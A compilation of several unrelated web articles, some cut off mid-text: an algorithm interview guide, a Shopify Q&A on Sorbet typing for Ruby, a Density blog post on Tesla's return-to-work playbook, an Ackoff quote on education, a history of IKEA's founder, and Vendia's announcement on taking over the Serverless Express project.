<p><span>There’s also two additional programming techniques you should be aware of:</span></p>
<ul>
<li><span>Dynamic Programming</span></li>
<li><span>Recursion</span></li>
</ul>
<p><span>Assuming the solution to your problem can be solved using the items in this list, we can come up with a simple algorithm to solve the problem.</span></p>
<h2><span>The Algorithm</span></h2>
<p><span>The algorithm goes like this:</span></p>
<ol>
<li><span>After being given the algorithm problem, ask for the specific runtime your solution will need to have. Almost certainly, the interviewer will tell you.</span></li>
<li><span>Filter out the data structures and algorithms that obviously aren’t relevant to the problem at hand. This will eliminate most of the list and you will usually be left with 2-3 data structures and algorithms.</span>
<ol>
<li><span>You can filter out data structures that are too slow. If you need to solve a problem in O(1) time, it’s impossible to use a binary tree in the solution, because a binary tree will always take at least O(log n) time.&nbsp;</span></li>
<li><span>You can filter out algorithms if they are impossible to use for the given problem. If there isn’t a graph in the problem, you know that depth-first search can’t be relevant.</span></li>
</ol>
</li>
<li><span>Go through the use cases for the remaining data structures and see which ones are relevant to the problem at hand. The solution for the problem is going to be a combination of these use cases. All you need to do is piece together these different use cases and you’ll come up with the solution to the problem.</span></li>
</ol>
<p><span>Let’s go through the runtimes and main use cases for each data structure and algorithm. Then walk through a few examples so you can see just how easy it is to use the algorithm.</span></p>

<p><span>Dynamic programming and recursion are a bit different in that they are general techniques for solving algorithm problems and not specific algorithms themselves. This means they don’t have concrete runtimes or use cases. The good news is after a bit of practice, it becomes fairly easy to recognize programs that can be solved with dynamic programming or recursion. My recommendation is practice a few problems that require dynamic programming or recursion so you can get a feel for them. Fully explaining dynamic programming and recursion is outside the scope of this post.</span></p>
<h2><span>Examples</span></h2>
<p><span>Now let’s take a look at a few different interview problems and how we can use the algorithm to solve them.</span></p>
<h3><span>Problem #1: Build a rate limiter</span></h3>
<p><span>This is a problem that I’ve seen multiple times across several different companies.</span></p>
<p><i><span>You need to write a function that can only be called at most N times within any 1 minute window. For example, it can be called at most 10 times in a minute. If the function is called more than N times it should throw an exception. The function should have expected O(1) performance.</span></i></p>
<p><span>Take a look at the data structures and algorithms we can use and see which ones can be used to solve the problem. Then try to see how you can use those data structures to solve the problem. Give it a shot before moving onto the solution.</span></p>
<ul>
<li><span>Hash Tables</span></li>
<li><span>Linked Lists</span></li>
<li><span>Binary Trees</span></li>
<li><span>Depth-first search</span></li>
<li><span>Binary Search</span></li>
<li><span>Sorting</span></li>
<li><span>Dynamic Programming</span></li>
<li><span>Recursion</span></li>
</ul>
<h3><span>Solution</span></h3>
<p><span>Let’s start by eliminating all the data structures and algorithms that obviously can’t be used:</span></p>
<ul>
<li><span>Hash Tables</span></li>
<li><span>Linked Lists</span></li>
<li><del><span>Binary Trees</span></del><span> – Too slow.</span></li>
<li><del><span>Depth-first search</span></del><span> – Too slow. There’s also no graph to run DFS on.</span></li>
<li><del><span>Binary Search</span></del><span> – Too slow. Also no sorted array.</span></li>
<li><del><span>Sorting</span></del><span> – Too slow. There’s also no elements to sort.</span></li>
<li><del><span>Dynamic Programming</span></del><span> – No way to apply dynamic programming to the problem.</span></li>
<li><del><span>Recursion</span></del><span> – No way to apply recursion to the problem.</span></li>
</ul>
<p><span>That leaves just hash tables and linked lists. If we go through the common use cases for hash tables, there doesn’t appear to be any way to apply them to the problem.&nbsp; We don’t need to quickly lookup different objects and we don’t need to partition a list of objects into different groups. That means we can cross off hash tables from the list.</span></p>
<p><span>The only data structure remaining are linked lists. Looking at the use cases the only two are for a stack and a queue. Can we use either of those to keep track of how many times a function has been called in the last minute? Yes! What we can do is keep a queue that has one entry for each time the function was called within the last minute. Whenever the function is called, we remove all entries from the queue that were inserted more than a minute ago. If the queue still has a length greater than N, we throw an exception. Otherwise we add a new entry to the queue with the current time. By keeping track of the length of the queue with a counter, we can determine with O(1) expected time, this function will have O(1) expected performance.</span></p>
<h3><span>Problem #2: Anagrams</span></h3>
<p><i><span>Given a list of words, produce a list of words in the input that are anagrams of at least one other word in the list. Two words are anagrams of each other if you can rearrange the letters in one to get the other. The runtime should be O(n) assuming the words have constant length.</span></i></p>
<p><span>Again attempt the problem yourself before reading the solution. Here’s the complete list of data structures and algorithms for reference:</span></p>
<ul>
<li><span>Hash Tables</span></li>
<li><span>Linked Lists</span></li>
<li><span>Binary Trees</span></li>
<li><span>Depth-first search</span></li>
<li><span>Binary Search</span></li>
<li><span>Sorting</span></li>
<li><span>Dynamic Programming</span></li>
<li><span>Recursion</span></li>
</ul>
<h3><span>Solution</span></h3>
<p><span>Let’s start by eliminating the items from the list that can’t possibly be used for this problem:</span></p>
<ul>
<li><span>Hash Tables</span></li>
<li><span>Linked Lists</span></li>
<li><del><span>Binary Trees</span></del><span> – Too slow.</span></li>
<li><del><span>Depth-first search</span></del><span> – There’s no graph.</span></li>
<li><del><span>Binary Search</span></del><span> – There’s no sorted array.</span></li>
<li><del><span>Sorting</span></del><span> – Too slow.</span></li>
<li><del><span>Dynamic Programming</span></del><span> – No way to apply DP to the problem.</span></li>
<li><del><span>Recursion</span></del><span> – No way to apply recursion to the problem.</span></li>
</ul>
<p><span>That leaves us with just hash tables and linked lists. Linked lists don’t seem to be relevant to the problem since it doesn’t look like there’s any way a stack or queue would help us. That leaves only hash tables left.</span></p>
<p><span>The only hash table use case that seems relevant here is the ability to split apart elements in a list into separate groups based on a property. In this case, if had a way to split the list into separate groups based on which words are anagrams of each other, that would give us a way to solve the problem:</span></p>
<ol>
<li><span>Split the list of words into separate groups based on which words are anagrams of each other.</span></li>
<li><span>Append all the groups together that have more than one word in it. This will produce a list of words that are anagrams of at least one other word in the input list.</span></li>
</ol>
<p><span>The only bit that’s left to solve is to find some property we can use to group anagrams together. We need to find some function f such that f(x) is the same as f(y) when x and y are anagrams of each other. There’s two different functions we can use to do this:</span></p>
<ul>
<li><span>Sort the characters of the words alphabetically. Since anagrams are all made up of the same letters. This will give us the same string for any pair of words that are anagrams of each.</span></li>
<li><span>Produce a dictionary of the number of times each letter occurs in each word. This solution is a bit trickier since you will need to somehow use the dictionary as a key in a hash table. Some languages have a way to do this, while others don’t.</span></li>
</ul>
<p><span>Now that we know how we can group words that are anagrams of each other together, we can put everything together to produce the solution!</span></p>
<p><span>Now let’s try one more problem.</span></p>
<h3><span>Problem #3: K-sorted</span></h3>
<p><i><span>Given an array of objects that is partially sorted, sort the array. Every element in the array is at most distance k away from its actual spot. You aren’t given the target runtime for this problem.</span></i></p>
<p><span>As usual, here’s the list of algorithms and data structures:&nbsp;</span></p>
<ul>
<li><span>Hash Tables</span></li>
<li><span>Linked Lists</span></li>
<li><span>Bin…</span></li></ul></div></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
  <p>Shopify changes a lot. We merge around 400 commits to the main branch daily and deploy a new version of our core monolith 40 times a day. The Monolith is also big: 37,000 Ruby files, 622,000 methods, more than 2,000,000 calls. At this scale with a dynamic language, even with the most rigorous review process and over 150,000 automated tests, it’s a challenge to ensure everything works properly. Developers benefit from a short feedback loop to ensure the stability of our monolith for our merchants.</p>
<p>Since 2018, our Ruby Infrastructure team has looked at ways to make the development process safer, faster, and more enjoyable for Ruby developers. While Ruby is different from other languages and brings amazing features allowing Shopify to be what it is today, we felt there was a feature from other languages missing: static typing.</p>

<p>On&nbsp;November 25, 2020, Shipit!, our monthly event series, presented The State of Ruby Static Typing at Shopify. Alexandre Terrasa and I talked about the history of static typing at Shopify and our adoption of Sorbet.</p>
<p><iframe width="560" height="315" src="https://www.youtube.com/embed/DA9gPuBkhFk" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p>We weren't able to answer all the questions during the event, so we've included answers to&nbsp;them&nbsp;below.</p>
<p><strong>What are some challenges with adopting Sorbet? What was some code you could not type?</strong></p>
<p>So far most of our problems are in modules that use ActiveSupport::Concern (many layers deep, even) and modules that assume they will be included in a certain kind of class, but have no way of making that explicit. For example, a module that assumes it will be included in an ActiveRecord model could be calling <code>before_save</code> to add a hook, but Sorbet would have no idea where <code>before_save</code> is defined. We are also looking to make those kinds of dependencies between modules and include sites explicit in Sorbet.</p>
<p>Inclusion requirements is also something we’re trying to fix right now, mostly for our helpers. The problem is explained in the description of this pull-request: <a href="https://github.com/sorbet/sorbet/pull/3409" target="_blank" title="Allow modules and classes to specify required ancestors #3409" rel="nofollow noopener noreferrer">https://github.com/sorbet/sorbet/pull/3409</a>.</p>
<p><strong>If a method has an array in argument, do you have to specify it is an array of what type? And if not, how do Sorbet makes the method you call on the array's element exists?</strong></p>
<p>It depends on the type of elements inside the array. For simple types like Integer or Foo, you can easily type it as <code>T::Array[Integer]</code> and Sorbet will be able to type check method calls. For more complex types like arrays containing hashes it depends, you may use <code>T::Array[T.untyped]</code> in which case Sorbet won’t be able to check the calls. Using <code>T.untyped</code> you can go as deep and precise you want it to be: <code>T::Array[T::Hash[String, T.untyped]]</code>, <code>T::Array[T::Hash[String, T::Array[T.untyped]]]</code>, <code>T::Array[T::Hash[String, T::Array[Integer]]]</code> and Sorbet will check the calls on what it knows about. Note that as your type becomes more and more complex, maybe you should start thinking about making a class about it so you can just use <code>T::Array[MyNewClass]</code>.</p>
<p><strong>How would you compare the benefits of Sorbet to Ruby relative to the benefits of Typescript to Javascript?</strong></p>
<p>There are similar benefits, but Ruby is a much more dynamic language than JavaScript and Sorbet is a much younger project than TypeScript. So the coverage of Ruby features and expressiveness of the type system of Sorbet lags behind the same benefits that TypeScript brings to JavaScript.On the other hand, Sorbet annotations are pure Ruby. That means you don’t have to learn a new language and you can keep using your existing editors and tooling to work with it. There is also no compilation of Ruby code with types to plain Ruby, like how you need to compile TypeScript to JavaScript. Finally, Sorbet also has a runtime type-checker and it can verify your types and alert you if they don’t check when your application is running, which is a great additional safety that TypeScript does not have.</p>
<p><strong>Could you quickly relate Sorbet with RBS and what is the future of sorbet after Ruby 3.0?</strong></p>
<p>Stripe gave an interesting answer to this question: <a href="https://sorbet.org/blog/2020/07/30/ruby-3-rbs-sorbet" target="_blank" rel="nofollow noopener noreferrer">https://sorbet.org/blog/2020/07/30/ruby-3-rbs-sorbet</a>. RBS is about the language to write the signatures, you still need a type checker to check those signatures against your code. We see Sorbet as one of the solution that can use those types, and currently it’s the fastest solution. One limitation of RBS is the lack of inline type annotations, for example there is no syntax to cast a variable to another type. So type checkers have to use additional syntax to make this possible. Even if Sorbet doesn’t support RBS at the moment, it might in the future. And in the case it never happens, remember that it’s easier to go from one type specification to another rather than an untyped codebase to a typed one. So all the efforts are not lost.</p>
<p><strong>Does Tapioca support Enums etc?</strong></p>
<p>Tapioca is able to generate RBI files for T::Enum definitions coming from gems. It can also generate method definitions for the ActiveRecord enums as DSL generators.</p>
<p><strong>In which scenarios would you NOT use Sorbet?</strong></p>
<p>I guess the one scenario where using Sorbet would be counterproductive is if there is no team buy-in for adopting Sorbet. If I were on such a team and I couldn’t convince the rest of the team of the utility of it, I would not push to use Sorbet.Other than that, I can only think of a code base that has a LOT of metaprogramming idioms to be a bad target for using Sorbet. You would still get some benefits from even running Sorbet at <code>typed: false</code> but it might not be worth the effort.</p>
<p><strong>What editors do you personally use? Any standardization across the organization?</strong></p>
<p>We have not standardized on a single editor across the company and we probably will not do so, since we believe in developers’ freedom to use the tools that make them the most productive. However, we also cannot build tooling for all editors, either. So, most of our developer acceleration team builds tooling primarily for VSCode, today. Ufuk personally uses VSCode and Alex uses VIM.</p>
<p><strong>Is there a roadmap for RBI -&gt; RBS conversion for when Ruby 3.0 comes out?</strong></p>
<p>No official roadmap yet, we’re still experimenting with this on the side of our main project: 100% typed: true files in our monolith. We can already say that some features from RBS will not directly translate to RBI and vice versa. You can see a comparison of both specifications here: <a href="https://github.com/Shopify/rbs_parser#whats-supported" target="_blank" title="rbs_parser What's supported" rel="nofollow noopener noreferrer">https://github.com/Shopify/rbs_parser#whats-supported</a> (might not be completely up-to-date with the latest version of RBS).</p>
<p><strong>What are the major challenges you had or are having with Ruby GraphQL libraries?</strong></p>
<p>Our team tried to marry the GraphQL typing system and the Sorbet types using RBI generation but we got stuck in some very dynamic usages of GraphQL resolvers, so we paused that work for now. On the other hand, there are teams within Shopify who have been using Sorbet and GraphQL together by changing the way they write GraphQL endpoints. You can read more about the technical details of that from the blog post of one of the Shopify engineers that has worked on that: <a href="https://gmalette.dev/posts/graphql-and-sorbet-and-unit-tests/" target="_blank" title="GraphQL love Sorbet and Unit Tests" rel="nofollow noopener noreferrer">https://gmalette.dev/posts/graphql-and-sorbet-and-unit-tests/</a>.</p>
<p><strong>What would be the first step in getting started with typing in a Rails project? What are kind of files that should be checked in to a repo?</strong></p>
<p>The fastest way to start is to use the steps listed on the Sorbet site to start running with Sorbet. After doing that, you can take a look at using <code>sorbet-rails</code> to generate Rails RBI files for you, or you can look at <code>tapioca</code> to generate gem RBIs. Since you can go gradual it’s totally up to you.</p>
<p>Our advice would be to first target all files at <code>typed: false</code>. If you use tapioca, the price is really low and already brings a lot of benefit. Then try to move the files to <code>type: true</code> where it does not create new type errors (you can use <code>spoom</code> for that: <a href="https://github.com/Shopify/spoom#change-the-sigil-used-in-files" target="_blank" title="Change the sigil used in files - spoom" rel="nofollow noopener noreferrer">https://github.com/Shopify/spoom#change-the-sigil-used-in-files</a>).</p>
<p>When it comes to adding signatures, prefer the files that are the most reused or, if you track the errors from production, going first with the files that create the most errors might be a good choice. Files touched by many teams are also an interesting target as signatures make collaboration easier. Files with a lot of churn. Or files defining methods reused a lot across your codebase.</p>
<p>As for the files that you need to check-in to a repository, the best practice is to check-in all the files (mostly RBI files) generated by Sorbet and/or tapioca/sorbet-typed. Those files enable the code to be type checked, so should be available to all the developers that work on the code base.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div id="blogContent"><p>There is no standard playbook for how to return millions of people to work. But that doesn't matter.</p><p>2021 is the year of <em>return to work</em>. Companies have no choice but to figure out how to bring their employees back to the office.</p><p>Fortunately, companies like Tesla have already invested incredible time and resources into shaping return-to-work playbooks that other companies can use for guidance and a starting point.</p><p>While not every approach will apply to you, four key takeaways from Tesla's playbook can help inform your own return-to-work strategy (create a cross functional crisis team, show employees how you're keeping them safe, monitor real-time occupancy, and prepare employees for the new normal).</p><p><em>You can download Tesla's return-to-work playbook </em><a href="https://www.tesla.com/sites/default/files/blog_attachments/Tesla-Return-to-Work-Playbook.pdf" target="_blank"><em>here</em></a><em>.</em></p><h2>Create a cross-functional crisis team</h2><p>Tesla created a crisis management team early on in the process. This team includes representatives from EHS (Environment, Health, and Safety), Security, Legal, Human Resources, Communications, Tesla Travel, and the company's Corporate Physician.</p><blockquote>The diversity of your cross-functional crisis team ensures more complete problem-solving.</blockquote><p>A cross-functional crisis management team gives you diversity — you have representatives from each of your key departments at the table. This diversity serves as an internal checks-and-balances system. EHS may have an idea on employee temperature checks — but what legal hurdles are there?</p><p>These decisions should be discussed and made by representatives from all your key departments.</p><h2>Show employees how you're keeping them safe</h2><p>As much as 64% of U.S. workers are anxious about returning to the workplace, according to a survey conducted by The Harris Poll (PR Newswire, 2020).</p><p>Reminding employees how you're keeping them safe will make your return to work more successful.</p><p>For Tesla, their playbook itself serves this purpose. Sections like "How We're Helping to Keep You Safe" give employees an at-a-glance look at every step Tesla has taken to be COVID-compliant:</p><figure id="w-node-7c09f6f6f07e-665b10f0"><p><img src="https://assets-global.website-files.com/5f4a004f01308268d80d6e85/5fcfcdf293b90c14dc82179a_tesla-coronavirus.jpg" loading="lazy" alt="Tesla coronavirus return to work playbook"></p></figure><p>The company also displays the signs above throughout its campuses, including in their shuttles and vans.</p><p>Signage is a significant part of Tesla's return-to-work policy. They display signs reminding employees not to come to work if they experience COVID symptoms and to use hand sanitizer and to remain socially distant. These signs reinforce healthy practices and help employees feel at ease.</p><p><strong>Other companies go one step further</strong> and use Density's Safe display to show any space's <a href="https://www.density.io/blog/safe-by-density">real-time occupancy</a>. This gives employees the confidence to travel anywhere on their work campus, knowing what to expect when they arrive at any space.</p><h2>Monitor real-time occupancy and traffic</h2><p>Monitoring how people actually use Tesla's space helps the leadership team <strong>verify</strong> compliance and <strong>adjust</strong> as needed.</p><p>Does the restroom cleaning schedule align with actual use? Do employees maintain six-foot distancing at entrances during high-volume times? Do smaller rooms (like meeting and break rooms) have the proper occupancy limit to ensure social distancing?</p><p>Companies use Density's anonymous people counting sensors to answer these questions — without violating employee privacy, such as lowering the occupancy limit of certain spaces and staggering schedules to reduce volume swell.</p><figure id="w-node-528afc2f5082-665b10f0"><p><img src="https://assets-global.website-files.com/5f4a004f01308268d80d6e85/5fcfceddecb4745aa34fb325_Monitor%20real-time%20occupancy%20and%20traffic.jpg" loading="lazy" alt=""></p><figcaption>Data gathered by Density informs companies on how to return to work safely and efficiently.</figcaption></figure><p>By monitoring foot traffic and usage patterns captured by Density, companies can also identify whether new restrooms and break rooms are needed — and where they would have the greatest impact.</p><h2>Prepare employees for the new normal</h2><p>Daily routines give us a sense of control. When our routines change, we feel like we've relinquished control. For many employees, a shift to remote work was a drastic change in routine.</p><p>Some employees may welcome a return to work as a return to familiarity — to a portion of their day they <em>can</em> control. But the workplace of 2021 will not look like the workplace of 2019. Changes could impact employees' sense of comfort and security (such as new one-way foot traffic patterns and closed-off spaces).</p><blockquote>The workplace of 2021 will not look like the workplace of 2019.</blockquote><p>Sharing a video walkthrough of your workspace will help employees see changes before they arrive (think of it as a virtual tour of the new campus). Tesla employees, for example, must watch a new safety training video, "as part of their preparation on what to expect when they return to work and as Tesla resumes operations."</p><p>The video helps employees understand what work will look like and reminds them how to stay safe (including demonstrations of proper hand-washing and PPE).</p><p>Your return-to-work playbook also prepares employees for this new normal. But don't wait for your playbook to be finalized to communicate with your team. Living through a pandemic is traumatic — it feels like we have no say in what we can do, where we can go, and who we can see. Early and consistent communication is key.</p><p>The return-to-work problem is two-fold: cultivating safety in the workplace <em>and</em> cultivating the appearance of safety. Yes, of course you need to protect employees. But you also need them to believe you're protecting them.</p><p>Be unabashedly transparent with your employees while your crisis management team designs your return-to-work policy. This gives employees a sense of responsibility, control, and comfort. Their insight can also help inform your preparation plans.</p><p><strong>Related reading</strong>:&nbsp;<a href="https://www.density.io/blog/occupancy-tracking-post-covid"><em>The return to work is coming.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
<p>“The objective of education is learning, not teaching,” emphasized management science pioneer <a href="http://en.wikipedia.org/wiki/Russell_L._Ackoff">Russell Ackoff</a> in a 2008 book with <a href="http://en.wikipedia.org/wiki/Sudbury_Valley_School">Sudbury Valley School</a> cofounder <a href="http://en.wikipedia.org/wiki/Daniel_Greenberg_%28educator%29">Daniel Greenberg</a>, <em><a href="http://www.amazon.com/Turning-Learning-Right-Side-Education/dp/0132887630">Turning Learning Right Side Up: Putting Education Back on Track</a></em>.</p>
<p>Published a year before Ackoff passed, the book complies their pithy email exchanges on educational reform. From Ackoff’s opening section (emphasis in original):</p>
<blockquote><p><em>Traditional education focuses on teaching, not learning.</em> It incorrectly assumes that for every ounce of teaching there is an ounce of learning by those that are taught. …</p>
<p>After lecturing to undergraduates at a major university, I was accosted by a student who had attended the lecture. After some complimentary remarks, he asked, “How long ago did you teach your first class?”</p>
<p>I responded, “In September of 1941.”</p>
<p>“Wow!” The student said. “You mean to say you have been teaching for more than 60 years?”</p>
<p>“Yes.”‘</p>
<p>“When did you last teach a course in a subject that existed when you were a student?”</p>
<p>This difficult question required some thought. After a pause, I said, “September of 1951.”</p>
<p>“Wow! You mean to say that everything you have taught in more than 50 years was not taught <em>to</em> you; you had to learn on your own?”</p>
<p>“Right.”</p>
<p>“You must be a pretty good learner.”</p>
<p>I modestly agreed.</p>
<p>The student then said, “What a shame you’re not that good a teacher.”</p>
<p>The student had it right; what most faculty members are good at, if anything, is learning rather than teaching.</p>
<p>Recall that in the one-room schoolhouse, students taught students. The teacher served as a guide and a resource but not as one who force-fed content into students’ minds.</p>
<p>There are many different ways of learning; teaching is only one of them. We learn a great deal on our own, in independent study or play. We learn a great deal interacting with others informally — sharing what we are learning with others and vice versa.</p>
<p>We learn a great deal by doing, through trial and error. Long before there were schools as we know them, there was apprenticeship — learning how to do something by trying it under the guidance of one who knows how. For example, one can learn more architecture by having to design and build one’s own house than by taking any number of courses on the subject. When physicians are asked whether they learned more in classes or during their internship, without exception they answer, “Internship.”</p>
<p>In the educational process, students should be offered a wide variety of ways to learn, among which they could choose or with which they could experiment. They do not have to learn different things the same way. They should learn at a very early stage of “schooling” that learning how to learn is largely their responsibility — with the help they seek but that is not imposed on them.</p>
<p><em>The objective of education is learning, not teaching.</em></p></blockquote>
<p>Many of these themes dovetail with those of <a href="http://en.wikipedia.org/wiki/John_Seely_Brown">John Seely Brown</a> in, say, 2008’s “<a href="http://www.educause.edu/ero/article/minds-fire-open-education-long-tail-and-learning-20">Minds on fire</a>” or the more recent “<a href="https://www.solvingforpattern.org/2012/10/01/john-seely-brown-global-one-room/">Global one-room schoolhouse</a>.”</p>
<p>For more on Ackoff, see also: “<a href="https://www.solvingforpattern.org/2012/07/07/russ-ackoff-whats-a-system/">What’s a system?</a>” a.k.a “If Russ Ackoff had given a TED talk.”</p>

    <section>
      
      

      <p><span>If you’ve ever been inside an IKEA, you know how hard it is to leave the store in any sort of timely manner. You didn’t know you needed five new dishtowels, but there you go, it’s yours now. And don’t forget the Swedish meatballs and lingonberry jam on the way out. All of this is the brainchild of the late Ingvar Kamprad, a Swedish businessman who came up with the idea for a store full of functional furniture that’s easy to put together. Kamprad passed away in 2018, but the story of how he built&nbsp;IKEA into one of the world’s best known brands is a rags to riches story for the ages. Today, we can get our “Billy” bookcases with ease and that’s thanks to the entrepreneurial spirit of Ingvar Kamprad.</span></p>
<hr>

<h2><span>Ingvar Kamprad's humble beginnings</span></h2>

<p><span><img alt="" src="https://static.media.thinknum.com/media/uploads/ikea_founder.jpg" width="1200"><span></span></span></p>
<p><span>Kamprad was born in 1926 on a farm in rural Sweden. He started his first business when he was just five years old. Young Ingvar bought matchbooks in bulk and sold them individually. By the time he was 10, he was selling pens, pencils, seeds for flowers, and Christmas tree decorations. Kamprad was dyslexic, but he didn’t let that hold him back. He worked hard and did well in his studies. His dad inspired him by paying him cash for doing well in school and Kamprad used that money to start IKEA in 1943. He was 17 years old. </span></p>
<p><span>The first IKEA sold small household goods like pens, wallets, and frames for pictures. It would be five years before the store got into the furniture business. As for how Kamprad came up with the name IKEA – it’s his initials Ingvar Kamprad followed by E for Elmtaryd, the family farm he grew up on, and Agunnaryd, his home village.&nbsp;</span><span>In 1945, Kamprad was using milk trucks to deliver his products. Two years later, in 1947, he started selling furniture made by local manufacturers. Kamprad made the mail order catalog an essential part of IKEA’s business from the start. After all,&nbsp;his area of Sweden was pretty rural and remote. Reaching customers in bigger cities, especially back in the 1940s and 1950s, was difficult.</span></p>
<hr>

<h2><span>The first catalog:&nbsp;</span><span>Cheap, chic, and convenient</span></h2>

<p><span><img alt="" src="https://static.media.thinknum.com/media/uploads/ikea-1951-catalog.jpg" width="1200"><span></span></span></p>
<p><span>Ingvar launched the iconic IKEA catalog in 1951. The prices were so low that people were skeptical about the quality of the furniture, so Kamprad rented an old workshop into a showroom to display his furniture. A few years later, Kamprad solved the problem of the expense of shipping large furniture when he took the legs of a coffee table so it could be packed flat. From that point on, as many products as possible were packed in this manner. It saved customers and IKEA money to pack items this way.</span></p>
<p><span>By 1955,&nbsp;<span>Kamprad's</span> manufacturers began boycotting IKEA due to his low prices. Kamprad solved this by bringing production and design in-house. His concept was complete. He designed, produced, showcased, flat-packed, and sold his own furniture all in-house. Kamprad believed that everyone should be able to afford stylish, modern furniture. That is the driving idea behind IKEA.&nbsp;</span></p>
<hr>

<h2><span>IKEA's worldwide expansion</span></h2>

<p><span><img alt="" src="https://static.media.thinknum.com/media/uploads/first-ikea-store.jpg" width="1200"><span></span></span></p>
<p><span><span>The first stores outside of sweden were opened in Norway in 1963 and Denmark in 1969. From there, it was only a matter of time before IKEA conquered Europe. A few short years later its first store outside of Scandanavia opened, and over the next decade IKEAs were popping up worldwide in countries like Japan, Australia and Canada, where crowds lined up for grand openings.<span>&nbsp;</span></span>Germany is IKEA’s biggest market with 53 stores, followed by the US with 51. Today there are 433 IKEA stores in 38 countries.&nbsp;</span></p>
<p><span>Kamprad never borrowed money. He kept IKEA private. Until his death in 2018 at the age of 91, Kamprad continued to traverse the globe visiting new IKEA stores—he did so frugally, despite his great wealth. He drove the same Volvo for more than 20 years and flew economy class. He was notoriously press shy and never, ever, gave an interview.&nbsp;</span></p>

<p><span>As for those weird product names—there’s a system to them. Beds have names of places in Norway. Sofas are named after towns in Sweden. Kitchen tables take their names from geography in Finland. Rugs have mostly Danish names. Chairs are mostly named after men. Glasses and cups have adjectives as names. Names are the same across the globe, like the infamous Billy bookcase. Bloomberg actually created an IKEA Billy bookshelf index back in 2010 to track the price of the popular shelves across the globe. They sold for the cheapest in France at EU $30 and the most expensive in Israel at ILS $325.&nbsp;</span></p>

    </span><a href="#about-serverless-express">About Serverless Express</a></h2><p>Back in 2016 I was General Manager of two up-and-coming AWS Services: <a href="https://aws.amazon.com/lambda/">AWS Lambda</a> and <a href="https://aws.amazon.com/api-gateway/">Amazon API Gateway</a>.</p><p>APIs were already well understood by our customer base, but selling Lambda was initially a little more difficult - not only was the idea of a fully managed, pay-by-the-call function hosting service a novelty among public cloud providers, it was also very different from existing developer practices. Case in point: <em>Express-based web services</em>.</p><p>Lambda launched with support for <a href="https://nodejs.org/en/">Node.js</a>, which helped a lot of customers start using it easily, given their existing familiarity with <a href="https://www.javascript.com/">JavaScript</a>. But for many customers, just having a familiar language wasn’t enough — they were also looking for familiar frameworks, such as <a href="https://expressjs.com/">Express</a>, on which to build their Lambda-based web applications.</p><p>After hearing this feedback from many customers, we realized we needed to “meet customers where they were” by bringing Serverless solutions to existing frameworks….and thus the <a href="https://github.com/vendia/serverless-express">Serverless Express GitHub project</a> was born!</p><p>Over the course of the last four years many developers have adopted Serverless solutions, including Serverless Express, to help accelerate development and gain Serverless benefits like lower operational overhead, automatic per-request scaling, built-in fault tolerance, and pay-per-call pricing. Today, the <a href="https://www.npmjs.com/package/aws-serverless-express">aws-serverless-express</a> NPM package gets over 1.3M downloads per month, and its GitHub repository has over 3.7K stars.</p><p>The original author of the Serverless Express project, <a href="https://twitter.com/AWSbrett">Brett Andrews</a>, joined <a href="http://vendia.net/">Vendia</a> recently, and we realized we can do even more in our mission to help customers share code and data effectively by giving back to the open source community by helping the Serverless Express project “graduate” from its initial location in AWS Labs to a permanent place in Vendia’s repository. As the original project sponsor, and with the guidance of the project’s original author, AWS trusted us to being thoughtful and proactive stewards of this project. We will continue meeting with AWS monthly to gather customer feedback, and be briefed on upcoming AWS Serverless releases so that we may be a launch partner and provide day 1 support in Serverless Express.</p><h2 id="migration-instructions"><span data-href="#migration-instructions">

    </span><a href="#migration-instructions">Migration Instructions</a></h2><p>If you’re an existing Serverless Express user, you don’t need to take any immediate action. For convenience we’ve published <a href="https://www.npmjs.com/package/aws-serverless-express">aws-serverless-express v3.4.0</a> that takes a direct dependency on the new official package <a href="https://www.npmjs.com/package/@vendia/serverless-express">@vendia/serverless-express@^3.4.0</a>.</p><p>This means that by simply upgrading to <a href="mailto:aws-serverless-express@3.4.0">aws-serverless-express@3.4.0</a> you’ll get all downstream patches and features without needing to update your code. Alternatively, you can run the following command  to take a direct dependency on the new official package</p><pre><code><span>npm</span> uninstall aws-serverless-express <span>&amp;&amp;</span> <span>npm</span> <span>install</span> @vendia/serverless-express
</code></pre><p>After updating the deps, update your code accordingly - e.g., change your imports.</p><pre><code><span>- require('aws-serverless-express')
</span><span>+ require('@vendia/serverless-express')
</span></code></pre><p>If you're new to Serverless Express and wondering how to get started, you can deploy a Serverless REST API to AWS in under 5 minutes by following the <a href="https://github.com/vendia/serverless-express/tree/master/examples/basic-starter">Serverless Express Basic Starter on GitHub</a>.</p><h2 id="whats-next"><span data-href="#whats-next">
      <svg>
        <use href="#link-out"></use>
      </svg>
    </span><a href="#whats-next">Whats Next</a></h2><p>In January 2021 we'll be releasing Serverless Express v4 that:</p><ol><li>Supports event sources other than API Gateway such as ALB, Lambda Edge, HTTP API, and makes it easy to provide your own custom event source mapping for other services that are integrated with Lambda</li><li>Has improved logging and debugging support</li><li>Is more extensible and simpler to use with an improved developer experience</li><li>Uses Promise resolution by default</li><li>Is upgraded to Node.js 10 (compatible with Node.js 12+)</li><li>Makes it easier to work with Custom Domain Names</li><li>Has improved documentation and examples</li><li>Supports Multiple header values</li></ol><p><em>What’s in it for Vendia?</em> First of all, Brett and I feel a strong connection to helping the Serverless community succeed. Technologies like Lambda, managed API and database services, and other Serverless offerings power Vendia’s implementations and help us deliver scalable, low-cost code and data sharing solutions for our customers. We also continue to believe strongly in the mission of Serverless Express: To give developers a simple, scalable platform that meets them where they are, and then helps them gain the best of what the cloud has to offer...without unnecessary retraining, rewriting, or porting exercises. We're also excited to find ways to bring Vendia Share - the next generation Serverless platform - and Serverless Express users closer together with easy ways to use both platforms in combination.</p><p>To all the existing (and future) Serverless Express users, we look forward to making your experience even better. To all the project contributors, we look forward to being great partners, building on your existing contributions and successes in this project. And to AWS, a huge “Thank You” for believing in this idea back when it felt risky and uncertain,and for allowing it to leave the nest now that it’s grown. Stay tuned for more technical and project roadmap details coming soon...and <em>Go Serverless!</em></p><p>Tim Wagner, Vendia CEO (and former AWS Lambda General Manager) &amp;

